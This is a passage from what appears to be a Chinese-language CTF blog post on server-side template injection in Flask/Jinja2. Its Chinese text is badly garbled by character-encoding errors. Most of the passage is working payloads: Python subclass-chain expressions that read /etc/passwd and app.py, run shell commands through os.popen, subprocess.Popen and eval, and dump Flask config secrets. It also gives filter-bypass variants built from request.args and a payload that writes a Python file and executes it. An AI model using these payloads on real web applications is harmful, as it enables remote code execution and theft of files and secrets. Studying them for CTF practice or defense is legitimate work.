&#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª`&lt;type &#39;file&#39;&gt;`</code></pre><p>4 ã€åˆ©ç”¨ä¹‹</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></pre><p>æ”¾åˆ°æ¨¡æ¿é‡Œ<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787928_5bd68ed820299.png!small" alt="5.png"></p><p>å¯ä»¥çœ‹åˆ°è¯»å–åˆ°äº†æ–‡ä»¶ã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>ç»§ç»­çœ‹å‘½ä»¤æ‰§è¡Œpayloadçš„æ„é€ ï¼Œæ€è·¯å’Œæ„é€ æ–‡ä»¶è¯»å–çš„ä¸€æ ·ã€‚</p><p>å¯»æ‰¾åŒ…å«osæ¨¡å—çš„è„šæœ¬</p><pre><code>#!/usr/bin/env python# encoding: utf-8for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():    try:         if &#39;os&#39; in item.__init__.__globals__:             print num,item         num+=1    except:        print &#39;-&#39;        num+=1</code></pre><p>è¾“å‡º</p><pre><code>-71 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt;</code></pre><p>payload</p><pre><code class="python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></pre><p>ä¸€èˆ¬åˆ©ç”¨ç‚¹è¿˜æœ‰ warnings.catch_warningsï¼ˆä¸€èˆ¬åœ¨59ï¼‰è¿™ä¸ªå­ç±»ï¼Œè™½ç„¶å®ƒæ²¡æœ‰osæ¨¡å—ï¼Œä½†warnings.catch_warningsç±»åœ¨åœ¨å†…éƒ¨å®šä¹‰äº†_module=sys.modules[â€˜warningsâ€™]ï¼Œç„¶åwarningsæ¨¡å—åŒ…å«æœ‰__builtins__ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœå¯ä»¥æ‰¾åˆ°warnings.catch_warningsç±»ï¼Œåˆ™å¯ä»¥ä¸ä½¿ç”¨globalsï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>æ€»è€Œè¨€ä¹‹ï¼ŒåŸç†éƒ½æ˜¯å…ˆæ‰¾åˆ°å«æœ‰__builtins__çš„ç±»ï¼Œç„¶åå†è¿›ä¸€æ­¥åˆ©ç”¨</p><ul><li>subprocess.Popenè¿›è¡ŒRCE</li></ul><p>æˆ‘ä»¬å¯ä»¥ç”¨find2.pyå¯»æ‰¾subprocess.Popenè¿™ä¸ªç±»ï¼Œå¯ä»¥ç›´æ¥RCEï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><ul><li>ç›´æ¥åˆ©ç”¨os</li></ul><p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºè¿™ç§æ–¹æ³•åªèƒ½ç”¨äºpython2ï¼Œå› ä¸ºæˆ‘åœ¨æœ¬åœ°å®éªŒçš„æ—¶å€™python3ä¸­æ— æ³•æ‰¾åˆ°ç›´æ¥å«æœ‰osçš„ç±»ï¼Œä½†åæ¥å‘ç°python3å…¶å®ä¹Ÿæ˜¯èƒ½å¤Ÿç”¨çš„ï¼Œä¸»è¦æ˜¯ç¯å¢ƒé‡Œé¢æœ‰è¿™ä¸ªé‚£ä¸ªç±»æ‰è¡Œ</p><p>æˆ‘ä»¬æŠŠä¸Šé¢çš„find.pyè„šæœ¬ä¸­çš„searchå˜é‡èµ‹å€¼ä¸ºosï¼Œå»å¯»æ‰¾å«æœ‰osçš„ç±»</p><pre><code>Î» python find.py(&lt;class &#39;site._Printer&#39;&gt;, 69)(&lt;class &#39;site.Quitter&#39;&gt;, 74)</code></pre><p>åé¢å¦‚æ³•ç‚®åˆ¶ï¼Œpayloadå¦‚ä¸‹</p><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code></pre><p>æ„é€ paylaodçš„æ€è·¯å’Œæ„é€ æ–‡ä»¶è¯»å–çš„æ˜¯ä¸€æ ·çš„ã€‚åªä¸è¿‡å‘½ä»¤æ‰§è¡Œçš„ç»“æœæ— æ³•ç›´æ¥çœ‹åˆ°ï¼Œéœ€è¦åˆ©ç”¨curlå°†ç»“æœå‘é€åˆ°è‡ªå·±çš„vpsæˆ–è€…åˆ©ç”¨ceye</p><p>ä¸€äº›åˆ©ç”¨è„šæœ¬ï¼š</p><p>find.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f5452aaf65534a159b2328f9b8152b07.jpeg" alt="img"></p><p>æˆ‘ä»¬è¿è¡Œè¿™ä¸ªè„šæœ¬</p><pre><code>Î» python3 find.py&lt;class &#39;os._wrap_close&#39;&gt; 128</code></pre><p>å¯ä»¥å‘ç°objectåŸºç±»çš„ç¬¬128ä¸ªå­ç±»åä¸ºos._wrap_closeçš„è¿™ä¸ªç±»æœ‰popenæ–¹æ³•</p><p>å…ˆè°ƒç”¨å®ƒçš„__init__æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ç±»</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__&lt;function _wrap_close.__init__ at 0x000001FCD0B21E58&gt;</code></pre><p>å†è°ƒç”¨__globals__å¯ä»¥è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•ã€å±æ€§ç­‰å€¼</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__&#123;&#39;__name__&#39;: &#39;os&#39;...ä¸­é—´çœç•¥...&lt;class &#39;os.PathLike&#39;&gt;&#125;</code></pre><p>ç„¶åå°±å¯ä»¥è°ƒç”¨å…¶ä¸­çš„popenæ¥æ‰§è¡Œå‘½ä»¤</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#39;desktop-t6u2ptl\\think\n&#39;</code></pre><p>ä½†æ˜¯ä¸Šé¢çš„æ–¹æ³•ä»…é™äºåœ¨æœ¬åœ°å¯»æ‰¾ï¼Œå› ä¸ºåœ¨åšCTFé¢˜ç›®çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ— æ³•åœ¨é¢˜ç›®ç¯å¢ƒä¸­è¿è¡Œè¿™ä¸ªfind.pyï¼Œè¿™é‡Œç”¨hhhmå¸ˆå‚…çš„ä¸€ä¸ªè„šæœ¬ç›´æ¥å»å¯»æ‰¾å­ç±»</p><p>æˆ‘ä»¬é¦–å…ˆæŠŠæ‰€æœ‰çš„å­ç±»åˆ—ä¸¾å‡ºæ¥</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...ä¸€å¤§å †çš„å­ç±»</code></pre><p>ç„¶åæŠŠå­ç±»åˆ—è¡¨æ”¾è¿›ä¸‹é¢è„šæœ¬ä¸­çš„aä¸­ï¼Œç„¶åå¯»æ‰¾os._wrap_closeè¿™ä¸ªç±»</p><p>find2.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/552cd597f7d84fcc9d284fdfe0fba5d4.jpeg" alt="img"></p><p>æˆ‘ä»¬é¦–å…ˆæŠŠæ‰€æœ‰çš„å­ç±»åˆ—ä¸¾å‡ºæ¥</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...ä¸€å¤§å †çš„å­ç±»</code></pre><p>ç„¶åæŠŠå­ç±»åˆ—è¡¨æ”¾è¿›ä¸‹é¢è„šæœ¬ä¸­çš„aä¸­ï¼Œç„¶åå¯»æ‰¾os._wrap_closeè¿™ä¸ªç±»</p><p>find2.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/552cd597f7d84fcc9d284fdfe0fba5d4" alt="img"></p><p>åˆæˆ–è€…ç”¨å¦‚ä¸‹çš„requestsè„šæœ¬å»è·‘</p><p>find3.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/4512851a74e64923982ffcf8b91e38b9.jpeg" alt="img"></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/9c63cdfd510c443a8294cfb5091773d6.jpeg" alt="img"></p><h1 id="åˆ©ç”¨è¿‡ç¨‹ï¼ˆè¯»å–configï¼‰"><a href="#åˆ©ç”¨è¿‡ç¨‹ï¼ˆè¯»å–configï¼‰" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹ï¼ˆè¯»å–configï¼‰"></a>åˆ©ç”¨è¿‡ç¨‹ï¼ˆè¯»å–configï¼‰</h1><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¯»å–configæˆ‘ä»¬ç›´æ¥å°±ï¼Œå°±èƒ½è¯»å–configé…ç½®æ–‡ä»¶ï¼Œä½†æ˜¯ä¸ºäº†å¢åŠ éš¾åº¦ï¼Œè‚¯å®šä¼šè¿‡æ»¤æ‰configï¼Œè®©æˆ‘ä»¬è¯»å–configé…ç½®æ–‡ä»¶</p><p>è¿™æ—¶å°±éœ€è¦é€šè¿‡pythonè‡ªå¸¦å‡½æ•°è°ƒç”¨____globals____å˜é‡é›†åˆ,ç„¶åè°ƒç”¨å…¶ä¸­çš„current_appå…¨å±€å˜é‡çš„config</p><h2 id="flaskæœ‰4ä¸ªå…¨å±€å˜é‡"><a href="#flaskæœ‰4ä¸ªå…¨å±€å˜é‡" class="headerlink" title="flaskæœ‰4ä¸ªå…¨å±€å˜é‡"></a>flaskæœ‰4ä¸ªå…¨å±€å˜é‡</h2><pre><code>current_appä»£è¡¨å½“å‰flaskç¨‹åºå®ä¾‹gä½œä¸ºflaskç¨‹åºå…¨å±€çš„ä¸´æ—¶å˜é‡requestså®¢æˆ·ç«¯å‘é€çš„HTTPè¯·æ±‚å†…å®¹sessionç”¨æˆ·ä¼šè¯</code></pre><h2 id="pythonè‡ªå¸¦å‡½æ•°"><a href="#pythonè‡ªå¸¦å‡½æ•°" class="headerlink" title="pythonè‡ªå¸¦å‡½æ•°"></a>pythonè‡ªå¸¦å‡½æ•°</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>ä½ å¯ä»¥ä»æ¨¡æ¿ä¸­ç›´æ¥è®¿é—®Flaskå½“å‰çš„configå¯¹è±¡:</p><pre><code>&#123;&#123;config.SQLALCHEMY_DATABASE_URI&#125;&#125;sqlite:///database.db</code></pre><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>å°±æ˜¯flaskä¸­ä»£è¡¨å½“å‰è¯·æ±‚çš„requestå¯¹è±¡ï¼š</p><pre><code>&#123;&#123;request.url&#125;&#125;http://127.0.0.1</code></pre><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>ä¸ºFlaskçš„sessionå¯¹è±¡</p><pre><code>&#123;&#123;session.new&#125;&#125;True</code></pre><h3 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h3><p>url_forä¼šæ ¹æ®ä¼ å…¥çš„è·¯ç”±å™¨å‡½æ•°å,è¿”å›è¯¥è·¯ç”±å¯¹åº”çš„URL,åœ¨æ¨¡æ¿ä¸­å§‹ç»ˆä½¿ç”¨url_for()å°±å¯ä»¥å®‰å…¨çš„ä¿®æ”¹è·¯ç”±ç»‘å®šçš„URL,åˆ™ä¸æ¯”æ‹…å¿ƒæ¨¡æ¿ä¸­æ¸²æŸ“å‡ºé”™çš„é“¾æ¥:</p><pre><code>&#123;&#123;url_for('home')&#125;&#125;/</code></pre><p>å¦‚æœæˆ‘ä»¬å®šä¹‰çš„è·¯ç”±URLæ˜¯å¸¦æœ‰å‚æ•°çš„,åˆ™å¯ä»¥æŠŠå®ƒä»¬ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ å…¥url_for(),Flaskä¼šæŠŠä»–ä»¬å¡«å……è¿›æœ€ç»ˆç”Ÿæˆçš„URLä¸­:</p><pre><code>&#123;&#123; url_for('post', post_id=1)&#125;&#125;/post/1</code></pre><h3 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h3><p>è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¹‹å‰åœ¨flaskä¸­é€šè¿‡flask()ä¼ å…¥çš„æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œflashå‡½æ•°çš„ä½œç”¨å¾ˆç®€å•,å¯ä»¥æŠŠç”±Pythonå­—ç¬¦ä¸²è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œå†ä½¿ç”¨get_flashed_message()å‡½æ•°å–å‡ºå®ƒä»¬å¹¶æ¶ˆè´¹æ‰ï¼š</p><pre><code>&#123;%for message in get_flashed_messages()%&#125;    &#123;&#123;message&#125;&#125;&#123;%endfor%&#125;</code></pre><p>å¤§è‡´playload</p><pre><code>&#123;&#123;url_for('__globals__')['current_app']['config']&#125;&#125;</code></pre><p>ä¸‹é¢æˆ‘åˆ—ä¸€äº›pos</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">è¯»ç›®å½•ã€æ–‡ä»¶&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').listdir('/')")&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].__dict__['system']('ls')&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('xxx','r').read()&#125;&#125;é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶#å‘½ä»¤æ‰§è¡Œï¼š &#123;% for c in [].__class__.__base__.__subclasses__() %&#125; #å…ˆé€šè¿‡forå¾ªç¯æ ¹æ®æ¨¡å—åå¯»æ‰¾ç¬¦åˆè¦æ±‚çš„æ¨¡å—&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;#å¦‚æœæ‰¾åˆ°è¯¥æ¨¡å—å°±è¿›è¡Œåç»­çš„å‡½æ•°æ“ä½œ&#123;% endif %&#125;&#123;% endfor %&#125;   # ç»“æŸåˆ¤æ–­ç»“æŸå¾ªç¯#æ–‡ä»¶æ“ä½œ    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h1 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h1><p>å¯¹ä¸€äº›è¿‡æ»¤çš„ç»•è¿‡æ–¹æ³•</p><h2 id="è¿‡æ»¤äº†å°æ‹¬å·"><a href="#è¿‡æ»¤äº†å°æ‹¬å·" class="headerlink" title="è¿‡æ»¤äº†å°æ‹¬å·"></a>è¿‡æ»¤äº†å°æ‹¬å·</h2><p>ç”¨pythonçš„å†…ç½®å‡½æ•°</p><ul><li>get_flashed_messages()</li><li>url_for()</li></ul><p>payload</p><pre><code class="python">&#123;&#123;url_for.__globals__&#125;&#125;&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;1234</code></pre><h2 id="è¿‡æ»¤äº†-classã€-subclassesã€-readç­‰å…³é”®è¯"><a href="#è¿‡æ»¤äº†-classã€-subclassesã€-readç­‰å…³é”®è¯" class="headerlink" title="è¿‡æ»¤äº† classã€ subclassesã€ readç­‰å…³é”®è¯"></a>è¿‡æ»¤äº† <code>class</code>ã€ <code>subclasses</code>ã€ <code>read</code>ç­‰å…³é”®è¯</h2><p>ç”¨request</p><ul><li>GET: request.args</li><li>Cookies: request.cookies</li><li>Headers: request.headers</li><li>Environment: request.environ</li><li>Values: request.values</li></ul><p>ä¸€äº›ç”¨æ³•</p><ul><li><code>request.__class__</code></li><li><code>request[&quot;__class__&quot;]</code></li><li><code>request|attr(&quot;__class__&quot;)</code></li></ul><p>payload</p><pre><code class="python">&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__1</code></pre><h2 id="è¿‡æ»¤äº†ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤äº†ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤äº†ä¸‹åˆ’çº¿_"></a>è¿‡æ»¤äº†ä¸‹åˆ’çº¿<code>_</code></h2><p>payload</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</code></pre><p>å…¶å®ç°è¿‡ç¨‹å¦‚ä¸‹</p><pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&#123;&#123;request|attr(["_"*2,"class","_"*2]|join)&#125;&#125;&#123;&#123;request|attr(["__","class","__"]|join)&#125;&#125;&#123;&#123;request|attr("__class__")&#125;&#125;&#123;&#123;request.__class__&#125;&#125;</code></pre><h2 id="è¿‡æ»¤äº†ä¸­æ‹¬å·-å’Œ"><a href="#è¿‡æ»¤äº†ä¸­æ‹¬å·-å’Œ" class="headerlink" title="è¿‡æ»¤äº†ä¸­æ‹¬å·[å’Œ]"></a>è¿‡æ»¤äº†ä¸­æ‹¬å·<code>[</code>å’Œ<code>]</code></h2><p>payload</p><pre><code class="python">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_12</code></pre><h2 id="è¿‡æ»¤äº†-join"><a href="#è¿‡æ»¤äº†-join" class="headerlink" title="è¿‡æ»¤äº†|join"></a>è¿‡æ»¤äº†<code>|join</code></h2><p>ç”¨<code>|format</code>    payload</p><pre><code class="python">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_1</code></pre><h2 id="æ— æ•Œç»•è¿‡çš„æœ€ç»ˆRCE"><a href="#æ— æ•Œç»•è¿‡çš„æœ€ç»ˆRCE" class="headerlink" title="æ— æ•Œç»•è¿‡çš„æœ€ç»ˆRCE"></a>æ— æ•Œç»•è¿‡çš„æœ€ç»ˆRCE</h2><p>ç»•è¿‡<code>[</code>ï¼Œ<code>]</code>æ£€æŸ¥ï¼Œä½†ä¸ç»•è¿‡<code>__</code>æ£€æŸ¥<br> ä½¿ç”¨è¯¥<code>set</code>å‡½æ•°æ¥è®¿é—®å¿…éœ€çš„<code>objectï¼ˆiï¼‰</code>ç±»<br> <code>pop()</code>å°†æ£€ç´¢fileå¯¹è±¡ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬çš„å·²çŸ¥å‚æ•°è°ƒç”¨è¯¥å¯¹è±¡<br> ä¸åˆå§‹RCEç›¸ä¼¼ï¼Œè¿™å°†åˆ›å»ºä¸€ä¸ªpythonæ–‡ä»¶<code>/tmp/foo.py</code>å¹¶æ‰§è¡Œ<code>print 1337</code>æœ‰æ•ˆè´Ÿè½½</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><p>ç»•è¿‡æ‰€æœ‰çš„rce</p><pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</code></pre><h1 id="python2çš„æ–¹æ³•"><a href="#python2çš„æ–¹æ³•" class="headerlink" title="python2çš„æ–¹æ³•"></a>python2çš„æ–¹æ³•</h1><p>å› ä¸ºpython3å’Œpython2ä¸¤ä¸ªç‰ˆæœ¬ä¸‹æœ‰å·®åˆ«ï¼Œè¿™é‡ŒæŠŠpython2å•ç‹¬æ‹¿å‡ºæ¥è¯´</p><p>tipsï¼špython2çš„stringç±»å‹ä¸ç›´æ¥ä»å±äºå±äºåŸºç±»ï¼Œæ‰€ä»¥è¦ç”¨ä¸¤æ¬¡ <strong>bases</strong>[0]</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/97cd39ea2aec44709fc68929a10ed2ea.jpeg" alt="img"></p><ul><li><h2 id="fileç±»è¯»å†™æ–‡ä»¶"><a href="#fileç±»è¯»å†™æ–‡ä»¶" class="headerlink" title="fileç±»è¯»å†™æ–‡ä»¶"></a>fileç±»è¯»å†™æ–‡ä»¶</h2></li></ul><p>æœ¬æ–¹æ³•åªèƒ½é€‚ç”¨äºpython2ï¼Œå› ä¸ºåœ¨python3ä¸­fileç±»å·²ç»è¢«ç§»é™¤äº†</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a9d24ae5c1bd41359cfba6666b1f6228.png" alt="img"></p><p>å¯ä»¥ä½¿ç”¨diræŸ¥çœ‹fileå¯¹è±¡ä¸­çš„å†…ç½®æ–¹æ³•</p><pre><code>&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40])[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</code></pre><p>ç„¶åç›´æ¥è°ƒç”¨é‡Œé¢çš„æ–¹æ³•å³å¯ï¼Œpayloadå¦‚ä¸‹</p><p>è¯»æ–‡ä»¶</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()&#125;&#125;</code></pre><ul><li><h2 id="warningsç±»ä¸­çš„linecache"><a href="#warningsç±»ä¸­çš„linecache" class="headerlink" title="warningsç±»ä¸­çš„linecache"></a>warningsç±»ä¸­çš„linecache</h2></li></ul><p>æœ¬æ–¹æ³•åªèƒ½ç”¨äºpython2ï¼Œå› ä¸ºåœ¨python3ä¸­ä¼šæŠ¥é”™â€™function objectâ€™ has no attribute 